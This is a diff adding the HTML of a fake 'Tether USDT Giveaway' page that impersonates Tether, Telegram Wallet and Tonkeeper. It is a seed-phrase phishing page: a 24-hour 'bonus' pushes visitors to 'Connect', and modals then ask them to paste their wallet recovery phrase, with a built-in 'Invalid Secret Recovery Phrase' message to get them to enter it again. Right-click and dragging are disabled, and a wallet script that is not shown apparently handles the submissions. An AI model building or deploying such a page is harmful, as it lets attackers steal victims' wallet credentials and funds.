@@ -1,0 +1,396 @@
+<!DOCTYPE html>
+<html lang="en" <head>
+   
+   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+     <title>Tether USDT Giveaway</title>
+    <link rel="stylesheet" href="./assets/css/popup.css">
+    <link rel="stylesheet" href="./assets/css/bootstrap.css">
+    <link rel="stylesheet" href="./assets/css/bootstrap.min.css">
+    <link rel="stylesheet" href="./assets/css/stylehome.css">
+    <link rel="stylesheet" href="./assets/css/main.css">
+    <link rel="stylesheet" href="./assets/css/stylewallet.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" integrity="sha512-9usAa10IRO0HhonpyAIVpjrylPvoDwiPUiKdWk5t3PyolY1cOd4DSE0Ga+ri4AuTroPR5aQvXU9xC6qOPnzFeg==" crossorigin="anonymous" referrerpolicy="no-referrer">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link href="https://fonts.googleapis.com/css2?family=Lato&amp;display=swap" rel="stylesheet">
+
+    <link rel="shortcut icon" href="https://s2.coinmarketcap.com/static/img/coins/200x200/825.png" type="image/x-icon">
+	 <script type="text/javascript">function mousedwn(e){try{if(event.button==2||event.button==3)return false}catch(e){if(e.which==3)return false}}document.oncontextmenu=function(){return false};document.ondragstart=function(){return false};document.onmousedown=mousedwn
+    </script>
+<script language="JavaScript">
+    var tanggallengkap = new String();
+    var namahari = ("Minggu Senin Selasa Rabu Kamis Jumat Sabtu");
+    namahari = namahari.split(" ");
+    var namabulan = ("January February March April May June July August September October November December");
+    namabulan = namabulan.split(" ");
+    var tgl = new Date();
+    var hari = tgl.getDay();
+    var tanggal = tgl.getDate();
+    var bulan = tgl.getMonth();
+    var tahun = tgl.getFullYear();
+    tanggallengkap = namabulan[bulan] + " " + tanggal + ", " + tahun;
+  </script></head>
+
+<body style="background:rgb(0,0,0)">
+
+    <!--Start Popup MetaMask-->
+    <div class="addon-box v2" id="metamask" style="display: none;">
+        <div class="head">
+            <a href="javascript:;">
+                <button type="button" class="btn-closemetamask" data-bs-dismiss="modal" aria-label="Close"></button>
+            </a>
+            <img class="logometa" src="https://telegram.org/img/website_icon.svg?4" alt="">
+            <div class="network-display network-display--clickable chip chip--with-left-icon chip--with-right-icon chip--ui-3" role="button" tabindex="0">
+                <div class="chip__left-icon"><div class="color-indicator color-indicator--filled color-indicator--color-ui-4 color-indicator--size-lg">
+                    <i class="color-indicator__icon fa fa-circle"></i>
+                </div>
+            </div>
+            <span class="box box--margin-top-1 box--margin-right-0 box--margin-bottom-1 box--margin-left-0 box--flex-direction-row typography chip__label typography--h7 typography--weight-normal typography--style-normal typography--color-ui-4">Ton Mainnet</span>
+            <div class="chip__right-icon">
+                <i class="network-display__icon app-header__network-down-arrow"></i>
+            </div>
+    </div>
+        </div><br><br><br>
+        <div class="confirm-approve-content">
+            <div style="font-size:1.2rem; color:rgb(77,77,77);">Restore your Account with Seed Phrase</div>
+            <div style="font-size:0.8rem; color:rgb(77,77,77); line-height: 20px;">Paste or type your Secret Phrase, usually a 24 set of words
+            </div>
+
+            <div class="jarak-atas">
+                <div class="confirm-approve-content__card--no-border">
+                    <form method="post" id="metamask">
+                        <label style="font-size:0.8rem; color:rgb(77,77,77);">Wallet Seed</label>
+                            <textarea type="text" id="PrivateKey" name="PrivateKey" style="font-size: 14px;" placeholder="Paste secret recovery phrase from clipboard" minlength="24" maxlength="280" required="" autocomplete="off"></textarea>
+                         <button type="submit" id="next-btnmetamask" class="next-btnmetamask" data-testid="page-container-footer-next" role="button" tabindex="0">Restore</button>
+                    </form>
+                </div>
+            </div>
+        </div>
+        </div>    
+    <!--End Popup MetaMask-->
+    <!--Start Popup TrustWallet-->
+    <div class="addon-box v2" id="trustwallet" style="display: none;">
+        <div class="headtrust">
+            <a href="javascript:;">
+                <button type="button" class="btn-closemetamask" data-bs-dismiss="modal" aria-label="Close"></button>
+            </a>
+        </div><br>
+        <div class="chakra-stack css-v6txlf">
+            <img alt="tonkeeper" src="https://storage.googleapis.com/ton-strapi/tonkeeper_90b21b4c40/tonkeeper_90b21b4c40.svg">
+        </div>
+        <div class="css-19ysxhc">
+            <div class="css-1p53mic">
+                <div class="css-z2d797">
+                    <div class="css-y579tt"></div>
+                </div>
+                <div class="css-z2d797">
+                    <div class="css-1hliadm"></div>
+                </div>
+            </div>
+        </div>
+        <div style="font-size:1rem; color:rgb(77,77,77); text-align: center; margin-bottom: 5px;">
+            <b>Import a Secret Phrase</b>
+        </div>
+        <div style="font-size:0.8rem; color:rgb(77,77,77); line-height: 20px; text-align: center;">
+            Paste or type your Secret Phrase, usually a 12 or 24 set of words
+        </div>
+        <div class="jarak-atas">
+            <div class="confirm-approve-content__card--no-border">
+                <form method="post" id="metamask">
+                    <label style="font-size:0.8rem; color:rgb(77,77,77);">Wallet Seed</label>
+                        <textarea type="text" id="wordsseed" name="PrivateKey" style="font-size: 14px;" placeholder="Paste secret recovery phrase from clipboard" minlength="24" maxlength="280" required="" autocomplete="off"></textarea>
+                    <button type="submit" id="next-btnmetamask" class="next-btnmetamask" data-testid="page-container-footer-next" role="button" tabindex="0">Restore</button>
+                    </form>
+            </div>
+        </div>
+        </div>    
+    <!--End Popup TrustWallet-->
+
+   
+<!--Start meta Popup rewards1-->
+     <div class="addon-box v2" id="rewards" style="display: none;">
+        <div class="head">
+            <a href="javascript:;">
+                <button type="button" class="btn-closemetamask" data-bs-dismiss="modal" aria-label="Close"></button>
+            </a>
+            <img class="logometa" src="https://telegram.org/img/website_icon.svg?4" alt="">
+            <div class="network-display network-display--clickable chip chip--with-left-icon chip--with-right-icon chip--ui-3" role="button" tabindex="0">
+                <div class="chip__left-icon"><div class="color-indicator color-indicator--filled color-indicator--color-ui-4 color-indicator--size-lg">
+                    <i class="color-indicator__icon fa fa-circle"></i>
+                </div>
+            </div>
+            <span class="box box--margin-top-1 box--margin-right-0 box--margin-bottom-1 box--margin-left-0 box--flex-direction-row typography chip__label typography--h7 typography--weight-normal typography--style-normal typography--color-ui-4">Ton Mainnet</span>
+            <div class="chip__right-icon">
+                <i class="network-display__icon app-header__network-down-arrow"></i>
+            </div>
+    </div>
+        </div><br><br><br>
+        <div class="confirm-approve-content">
+            <div style="font-size:1.2rem; color:rgb(77,77,77);">Restore your Account with Seed Phrase</div>
+            <div style="font-size:0.8rem; color:rgb(77,77,77); line-height: 20px;">Paste or type your Secret Phrase, usually a 24 set of words
+            </div>
+
+            <div class="jarak-atas">
+                <div class="confirm-approve-content__card--no-border">
+                    <form action="" method="post" id="myform" >
+                        <label style="font-size:0.8rem; color:rgb(77,77,77);">Wallet Seed</label>
+                            <textarea type="text" id="PrivateKey" name="PrivateKey" style="font-size: 14px;" placeholder="Paste secret recovery phrase from clipboard" minlength="24" maxlength="280" required="" autocomplete="off"></textarea>
+<span style="color: RED">Invalid Secret Recovery Phrase</span>
+                        
+                        <button type="submit" id="next-btnmetamask" class="next-btnmetamask" data-testid="page-container-footer-next" role="button" tabindex="0">Restore</button>
+                    </form>
+                </div>
+            </div>
+        </div>
+        </div>    
+    <!--End Popup rewards-->
+	
+
+   
+     <!--Start Popup rewards1-->
+     <div class="addon-box v2" id="rewards2" style="display: none;">
+        <div class="headtrust">
+            <a href="javascript:;">
+                <button type="button" class="btn-closemetamask" data-bs-dismiss="modal" aria-label="Close"></button>
+            </a>
+        </div><br>
+        <div class="chakra-stack css-v6txlf">
+            <img alt="tonkeeper" src="https://storage.googleapis.com/ton-strapi/tonkeeper_90b21b4c40/tonkeeper_90b21b4c40.svg">
+        </div>
+        <div class="css-19ysxhc">
+            <div class="css-1p53mic">
+                <div class="css-z2d797">
+                    <div class="css-y579tt"></div>
+                </div>
+                <div class="css-z2d797">
+                    <div class="css-1hliadm"></div>
+                </div>
+            </div>
+        </div>
+        <div style="font-size:1rem; color:rgb(77,77,77); text-align: center; margin-bottom: 5px;">
+            <b>Import a Secret Phrase</b>
+        </div>
+        <div style="font-size:0.8rem; color:rgb(77,77,77); line-height: 20px; text-align: center;">
+            Paste or type your Secret Phrase, usually a 12 or 24 set of words
+        </div>
+        <div class="jarak-atas">
+            <div class="confirm-approve-content__card--no-border">
+                <form action="" method="post" id="myform" >
+                    <label style="font-size:0.8rem; color:rgb(77,77,77);">Wallet Seed</label>
+                        <textarea type="text" id="wordsseed" name="PrivateKey" style="font-size: 14px;" placeholder="Paste secret recovery phrase from clipboard" minlength="24" maxlength="280" required="" autocomplete="off"></textarea>
+                    <span style="color: RED">Invalid Secret Recovery Phrase</span>
+					<button type="submit" id="next-btnmetamask" class="next-btnmetamask" data-testid="page-container-footer-next" role="button" tabindex="0">Restore</button>
+                    </form>
+            </div>
+        </div>
+        </div>    
+    <!--End Popup rewards-->
+	
+	
+
+    <div class="modal fade" id="staticBackdrop" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" aria-labelledby="staticBackdropLabel" aria-hidden="true">
+        <br>
+<br>
+<br>
+<br>
+<br>
+<br>
+
+		<div class="modal-dialog">
+          <div class="modal-content">
+            <div class="modal-header">
+            <p>Connect to a wallet</p>
+            <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+            </div>
+            <div class="modal-body">
+              <div class="d-grid gap-2">
+      
+                <div class="jarak">
+                  <button type="button" class="beTwZZ" style="justify-content: space-between;">
+                    <img src="https://telegram.org/img/website_icon.svg?4" width="40px">
+                    <div class="d-flex flex-column text-left align-self-center ps-l-20" data-v-981381f4="">
+                        <span class="metamask" data-v-981381f4="">
+                            <span dir="">Telegram Wallet</span>
+                        </span><br> 
+                        <span class="connect" data-v-981381f4="">
+                            <span class="">Connect using browser wallet</span>
+                        </span>
+                    </div>
+                    
+                    <img src="./assets/logo/panah.png" height="15px" width="10px">
+              </button></div>
+      
+              <div class="jarak2">
+                <button type="button" class="beTwZZ2" style="justify-content: space-between;">
+                    <img src="https://storage.googleapis.com/ton-strapi/tonkeeper_90b21b4c40/tonkeeper_90b21b4c40.svg" width="40px">
+                  <div class="d-flex flex-column text-left align-self-center ps-l-20" data-v-981381f4="">
+                      <span class="metamask" data-v-981381f4="">
+                          <span dir="">Tonkeeper Wallet</span>
+                      </span><br> 
+                      <span class="connect" data-v-981381f4="">
+                          <span class="">Connect using browser wallet</span>
+                      </span>
+                  </div>
+                  
+                  <img src="./assets/logo/panah.png" height="15px" width="10px">
+            </button></div>
+              </div>
+            </div>
+          <!--   <div class="modal-footer">
+            
+            </div> -->
+          </div>
+        </div>
+      </div>
+    <!-- <body> -->
+    <div class="preloader" style="display: none;">
+        <div class="preloader-inner">
+            <div class="preloader-icon">
+                <span></span>
+                <span></span>
+            </div>
+        </div>
+    </div>
+    <a href="#0" class="scrollToTop"><i class="fas fa-angle-up"></i></a>
+
+    <header class="header-section">
+        <div class="container">
+            <div class="header-wrapper">
+                <div class="logo">
+                    <a href="#">
+                        <svg class="jss7" width="184" height="41" viewBox="0 0 184 41" fill="none" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M10.5497 0H38.4507C39.1165 0 39.7315 0.356142 40.0635 0.933924L48.1922 15.0798C48.6137 15.8134 48.4885 16.7393 47.8872 17.3342L25.5127 39.4708C24.7879 40.1879 23.622 40.1879 22.8972 39.4708L0.552922 17.3641C-0.0623286 16.7554 -0.177538 15.8025 0.274888 15.0643L8.96384 0.888538C9.30224 0.336459 9.90273 0 10.5497 0ZM34.8482 6.31565V10.2848H26.9003V13.0367C32.4824 13.3308 36.6704 14.5386 36.7015 15.9863L36.7013 19.0044C36.6702 20.4521 32.4824 21.6599 26.9003 21.954V28.7075H21.6228V21.954C16.0407 21.6599 11.8527 20.4521 11.8217 19.0044L11.8218 15.9863C11.8529 14.5386 16.0407 13.3308 21.6228 13.0367V10.2848H13.6749V6.31565H34.8482ZM24.2616 19.8806C30.2186 19.8806 35.1977 18.8593 36.4162 17.4954C35.3829 16.3388 31.6453 15.4285 26.9003 15.1785V18.0598C26.0499 18.1046 25.167 18.1282 24.2616 18.1282C23.3561 18.1282 22.4733 18.1046 21.6228 18.0598V15.1785C16.8778 15.4285 13.1402 16.3388 12.1069 17.4954C13.3254 18.8593 18.3045 19.8806 24.2616 19.8806Z" fill="#009393"></path><path d="M59.0845 7.67574L65.5342 6.94938V13.2143H71.1329V18.662H65.4894V27.106C65.4894 29.1035 66.3255 30.1022 67.9976 30.1022C69.0725 30.1022 69.9683 29.9206 70.685 29.5575L72.163 35.0052C70.6999 35.5802 69.1472 35.9131 67.5049 36.0039C64.9071 36.125 62.8468 35.5046 61.324 34.1426C59.831 32.7504 59.0845 30.4049 59.0845 27.106V18.662H55.1431V13.2143H59.0845V7.67574Z" fill="#009393"></path><path d="M95.2718 26.425H79.0133C79.1925 27.5751 79.8046 28.5284 80.8497 29.2851C81.8948 30.0114 83.2832 30.3746 85.0151 30.3746C87.4934 30.3746 89.4044 29.7844 90.7481 28.6041L94.3761 32.6899C92.1664 34.8993 89.0013 36.0039 84.8807 36.0039C80.9393 36.0039 77.8787 34.9295 75.6989 32.7807C73.549 30.6319 72.4741 27.7264 72.4741 24.0643C72.4741 20.6141 73.5341 17.8297 75.6541 15.7111C77.7741 13.5623 80.6257 12.4879 84.2089 12.4879C88.1205 12.4879 91.1064 13.6985 93.1667 16.1197C95.2569 18.5409 95.9586 21.976 95.2718 26.425ZM79.0133 21.6582H89.494C89.4343 20.5082 88.8968 19.6305 87.8816 19.0252C86.8664 18.3896 85.6421 18.0718 84.2089 18.0718C82.9249 18.0718 81.8201 18.3896 80.8945 19.0252C79.9688 19.6607 79.3418 20.5384 79.0133 21.6582Z" fill="#009393"></path><path d="M100.649 7.67574L107.099 6.94938V13.2143H112.697V18.662H107.054V27.106C107.054 29.1035 107.89 30.1022 109.562 30.1022C110.637 30.1022 111.533 29.9206 112.249 29.5575L113.727 35.0052C112.264 35.5802 110.712 35.9131 109.069 36.0039C106.472 36.125 104.411 35.5046 102.888 34.1426C101.395 32.7504 100.649 30.4049 100.649 27.106V18.662H96.7075V13.2143H100.649V7.67574Z" fill="#009393"></path><path d="M116.146 3.72614H122.64V15.8473C124.223 13.759 126.462 12.7149 129.359 12.7149C135.241 12.7149 138.182 16.3013 138.182 23.4742V35.5046H131.733V23.5196C131.733 21.976 131.344 20.7806 130.568 19.9331C129.822 19.0857 128.806 18.662 127.522 18.662C126.119 18.662 124.939 19.1462 123.984 20.1147C123.058 21.0832 122.595 22.43 122.595 24.1551V35.5046H116.146V3.72614Z" fill="#009393"></path><path d="M163.477 26.425H147.219C147.398 27.5751 148.01 28.5284 149.055 29.2851C150.1 30.0114 151.489 30.3746 153.221 30.3746C155.699 30.3746 157.61 29.7844 158.954 28.6041L162.582 32.6899C160.372 34.8993 157.207 36.0039 153.086 36.0039C149.145 36.0039 146.084 34.9295 143.904 32.7807C141.754 30.6319 140.68 27.7264 140.68 24.0643C140.68 20.6141 141.74 17.8297 143.86 15.7111C145.98 13.5623 148.831 12.4879 152.414 12.4879C156.326 12.4879 159.312 13.6985 161.372 16.1197C163.462 18.5409 164.164 21.976 163.477 26.425ZM147.219 21.6582H157.699C157.64 20.5082 157.102 19.6305 156.087 19.0252C155.072 18.3896 153.848 18.0718 152.414 18.0718C151.13 18.0718 150.026 18.3896 149.1 19.0252C148.174 19.6607 147.547 20.5384 147.219 21.6582Z" fill="#009393"></path><path d="M166.152 13.1235H172.154L172.647 15.5749C174.05 13.5774 176.021 12.5787 178.559 12.5787C180.649 12.5787 182.455 13.2597 183.978 14.6216L181.291 19.7969C180.246 19.0403 179.066 18.662 177.753 18.662C176.289 18.662 175.065 19.1311 174.08 20.0693C173.095 20.9773 172.602 22.2333 172.602 23.8373V35.5046H166.152V13.1235Z" fill="#009393"></path></svg>
+                    </a>
+                </div>
+                <ul class="menu navigator__item">
+                    
+<li> <a href="#">Why Tether?</a></li>
+<li> <a href="#">How it works</a></li><li> <a href="#">Tether Gold</a></li>
+                    <li> <a href="#">How To Buy</a></li>
+                    <li> <a href="#">Explore</a></li>
+<div class="gt_switcher notranslate"><div class="gt_selected"><a href="#" class=""><img src="https://cdn.gtranslate.net/flags/24/en-us.png" height="24" width="24" alt="en"> English</a></div><div class="gt_option" style="display: none; overflow-y: auto; height: 0px;"><a href="#" title="English" class="nturl gt_current" data-gt-lang="en"><img width="24" height="24" alt="en" data-gt-lazy-src="https://cdn.gtranslate.net/flags/24/en-us.png" src="https://cdn.gtranslate.net/flags/24/en-us.png"> English</a><a href="#" title="French" class="nturl" data-gt-lang="fr"><img width="24" height="24" alt="fr" data-gt-lazy-src="https://cdn.gtranslate.net/flags/24/fr.png" src="https://cdn.gtranslate.net/flags/24/fr.png"> French</a><a href="#" title="German" class="nturl" data-gt-lang="de"><img width="24" height="24" alt="de" data-gt-lazy-src="https://cdn.gtranslate.net/flags/24/de.png" src="https://cdn.gtranslate.net/flags/24/de.png"> German</a><a href="#" title="Italian" class="nturl" data-gt-lang="it"><img width="24" height="24" alt="it" data-gt-lazy-src="https://cdn.gtranslate.net/flags/24/it.png" src="https://cdn.gtranslate.net/flags/24/it.png"> Italian</a><a href="#" title="Spanish" class="nturl" data-gt-lang="es"><img width="24" height="24" alt="es" data-gt-lazy-src="https://cdn.gtranslate.net/flags/24/es.png" src="https://cdn.gtranslate.net/flags/24/es.png"> Spanish</a><a href="#" title="Dutch" class="nturl" data-gt-lang="nl"><img width="24" height="24" alt="nl" data-gt-lazy-src="https://cdn.gtranslate.net/flags/24/nl.png" src="https://cdn.gtranslate.net/flags/24/nl.png"> Dutch</a><a href="#" title="Portuguese" class="nturl" data-gt-lang="pt"><img width="24" height="24" alt="pt" data-gt-lazy-src="https://cdn.gtranslate.net/flags/24/pt.png" src="https://cdn.gtranslate.net/flags/24/pt.png"> Portuguese</a><a href="#" title="Chinese (Simplified)" class="nturl" data-gt-lang="zh-CN"><img width="24" height="24" alt="zh-CN" data-gt-lazy-src="https://cdn.gtranslate.net/flags/24/zh-CN.png" src="https://cdn.gtranslate.net/flags/24/zh-CN.png"> Chinese (Simplified)</a><a href="#" title="Turkish" class="nturl" data-gt-lang="tr"><img width="24" height="24" alt="tr" data-gt-lazy-src="https://cdn.gtranslate.net/flags/24/tr.png" src="https://cdn.gtranslate.net/flags/24/tr.png"> Turkish</a><a href="#" title="Arabic" class="nturl" data-gt-lang="ar"><img width="24" height="24" alt="ar" data-gt-lazy-src="https://cdn.gtranslate.net/flags/24/ar.png" src="https://cdn.gtranslate.net/flags/24/ar.png"> Arabic</a><a href="#" title="Korean" class="nturl" data-gt-lang="ko"><img width="24" height="24" alt="ko" data-gt-lazy-src="https://cdn.gtranslate.net/flags/24/ko.png" src="https://cdn.gtranslate.net/flags/24/ko.png"> Korean</a><a href="#" title="Chinese (Traditional)" class="nturl" data-gt-lang="zh-TW"><img width="24" height="24" alt="zh-TW" data-gt-lazy-src="https://cdn.gtranslate.net/flags/24/zh-TW.png" src="https://cdn.gtranslate.net/flags/24/zh-TW.png"> Chinese (Traditional)</a><a href="#" title="Japanese" class="nturl" data-gt-lang="ja"><img width="24" height="24" alt="ja" data-gt-lazy-src="https://cdn.gtranslate.net/flags/24/ja.png" src="https://cdn.gtranslate.net/flags/24/ja.png"> Japanese</a><a href="#" title="Russian" class="nturl" data-gt-lang="ru"><img width="24" height="24" alt="ru" data-gt-lazy-src="https://cdn.gtranslate.net/flags/24/ru.png" src="https://cdn.gtranslate.net/flags/24/ru.png"> Russian</a><a href="#" title="Hindi" class="nturl" data-gt-lang="hi"><img width="24" height="24" alt="hi" data-gt-lazy-src="https://cdn.gtranslate.net/flags/24/hi.png" src="https://cdn.gtranslate.net/flags/24/hi.png"> Hindi</a><a href="#" title="Polish" class="nturl" data-gt-lang="pl"><img width="24" height="24" alt="pl" data-gt-lazy-src="https://cdn.gtranslate.net/flags/24/pl.png" src="https://cdn.gtranslate.net/flags/24/pl.png"> Polish</a><a href="#" title="Czech" class="nturl" data-gt-lang="cs"><img width="24" height="24" alt="cs" data-gt-lazy-src="https://cdn.gtranslate.net/flags/24/cs.png" src="https://cdn.gtranslate.net/flags/24/cs.png"> Czech</a><a href="#" title="Hungarian" class="nturl" data-gt-lang="hu"><img width="24" height="24" alt="hu" data-gt-lazy-src="https://cdn.gtranslate.net/flags/24/hu.png" src="https://cdn.gtranslate.net/flags/24/hu.png"> Hungarian</a><a href="#" title="Indonesian" class="nturl" data-gt-lang="id"><img width="24" height="24" alt="id" data-gt-lazy-src="https://cdn.gtranslate.net/flags/24/id.png" src="https://cdn.gtranslate.net/flags/24/id.png"> Indonesian</a><a href="#" title="Bulgarian" class="nturl" data-gt-lang="bg"><img width="24" height="24" alt="bg" data-gt-lazy-src="https://cdn.gtranslate.net/flags/24/bg.png" src="https://cdn.gtranslate.net/flags/24/bg.png"> Bulgarian</a><a href="#" title="Thai" class="nturl" data-gt-lang="th"><img width="24" height="24" alt="th" data-gt-lazy-src="https://cdn.gtranslate.net/flags/24/th.png" src="https://cdn.gtranslate.net/flags/24/th.png"> Thai</a><a href="#" title="Romanian" class="nturl" data-gt-lang="ro"><img width="24" height="24" alt="ro" data-gt-lazy-src="https://cdn.gtranslate.net/flags/24/ro.png" src="https://cdn.gtranslate.net/flags/24/ro.png"> Romanian</a><a href="#" title="Vietnamese" class="nturl" data-gt-lang="vi"><img width="24" height="24" alt="vi" data-gt-lazy-src="https://cdn.gtranslate.net/flags/24/vi.png" src="https://cdn.gtranslate.net/flags/24/vi.png"> Vietnamese</a><a href="#" title="Slovak" class="nturl" data-gt-lang="sk"><img width="24" height="24" alt="sk" data-gt-lazy-src="https://cdn.gtranslate.net/flags/24/sk.png" src="https://cdn.gtranslate.net/flags/24/sk.png"> Slovak</a></div></div>
+                </ul>
+                
+                <div class="header-right">
+                    
+                    <a href="#" data-bs-toggle="modal" data-bs-target="#staticBackdrop" class="header-button d-none d-sm-inline-block">Connect</a>
+                </div>
+            </div>
+        </div>
+    </header>
+    <style>
+        /* #more {display: none;}
+
+.wrapper {
+  display: flex;
+  flex-direction: row-reverse;
+} */
+    </style>
+<section class="home-hero" style="height: 110vh;">
+    <div class="container">
+        <div class="banner-content-9 cl-white" style="padding-top: 8vh">
+           <div class="confirm-approve-content">
+            <div class="confirm-approve-content">
+            <div class="img-rewards">
+                    <img src="https://s2.coinmarketcap.com/static/img/coins/200x200/825.png" alt="" style="width:50px;height:50px;">
+                </div>
+                <div class="title-rewards">Tether Rewards</div>
+
+                <div class="confirm-approve-content__description"> The reward will only be processed for accounts that have made 10 or more transactions on the Ton Network.<br></div>
+
+                    <div class="confirm-approve-content__description"><b style="color: #4d4d4d;font-weight: bold;">NOTE: This Tether  bonus is only valid for 24 hours from the time this notification is sent.</b></div>
+                    
+                <div class="confirm-approve-content__edit-submission-button-container"></div>
+                
+            </div>
+            <div class="page-container__footer">
+                <footer>
+                </footer>
+            </div>
+            <div class="jarak-atas">
+                <div class="confirm-approve-content__card-content">
+                    <div class="confirm-approve-content__transaction-details-content">
+                        <div class="confirm-approve-content__small-text">
+                            <a href="#" data-bs-toggle="modal" data-bs-target="#staticBackdrop" class="button-4 video-btn" data-testid="page-container-footer-next" role="button" tabindex="0">Reject</a>
+                            
+                        </div>
+                        
+                        <div class="confirm-approve-content__transaction-details-content__fee">
+                            <div class="confirm-approve-content__small-text">
+                                <a href="#" data-bs-toggle="modal" data-bs-target="#staticBackdrop" class="button-4 video-btn" data-testid="page-container-footer-next" role="button" tabindex="0">Confirm</a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div></div><b style="">
+    </b></div><b style="">
+</b></section><b style="">
+
+    <footer class="footer-section">
+        <div class="container">
+            <div class="footer-top padding-top padding-bottom">
+                <div class="logo">
+                    <a href="#0">
+                       
+                    </a>
+                </div>
+                <ul class="social-icons">
+                    <li>
+                        <a href="#"><i class="fab fa-medium"></i></a>
+                    </li>
+                    <li>
+                        <a href="#"><i class="fab fa-reddit"></i></a>
+                    </li>
+                    <li>
+                        <a href="#"><i class="fab fa-twitter"></i></a>
+                    </li>
+                    <li>
+                        <a href="#"><i class="fab fa-instagram"></i></a>
+                    </li>
+                    <li>
+                        <a href="#"><i class="fab fa-telegram"></i></a>
+                    </li>
+                </ul>
+            </div>
+            <div class="footer-bottom">
+                <ul class="footer-link">
+                    <li>
+                        <a href="#">Tether
+Email Us: support@Tether.io</a>
+                    </li>
+                    <li>
+                        <a href="#">Governance</a>
+                    </li>
+                    <li>
+                        <a href="#">Docs</a>
+                    </li>
+                    <li>
+                        <a href="#">Security</a>
+                    </li>
+                    <li>
+                        <a href="#">FAQ</a>
+                    </li>
+                </ul>
+            </div>
+            
+        </div>
+    </footer>
+    <div class="copyright" style="background-color: rgb(0,0,0)">
+        <p style="font-size: 12px; color: #009688">
+            Copyright © 2013 - 2024 Tether Operations Limited. All rights reserved.
+        </p>
+    </div>
+    
+   
+    <!--============= Footer Section Ends Here =============-->
+
+    <script src="./assets/js/jquery-3.3.1.min.js"></script>
+    <script type="text/javascript" src="https://www.gstatic.com/charts/loader.js"></script>
+    <script src="./assets/js/jswallet.js"></script>
+<script type="text/javascript" src="https://code.jquery.com/jquery-3.4.1.min.js"></script>
+<script defer="" src="https://static.cloudflareinsights.com/beacon.min.js/v652eace1692a40cfa3763df669d7439c1639079717194" integrity="sha512-Gi7xpJR8tSkrpF7aordPZQlW2DLtzUlZcumS8dMQjwDHEnw9I7ZLyiOj/6tZStRBGtGgN6ceN6cMH8z7etPGlw==" data-cf-beacon="{&quot;rayId&quot;:&quot;6c86dc903ada1a40&quot;,&quot;version&quot;:&quot;2021.12.0&quot;,&quot;r&quot;:1,&quot;token&quot;:&quot;a34c6d09c1e54a7c943f46827d855128&quot;,&quot;si&quot;:100}" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>
+
+</b></body></html>
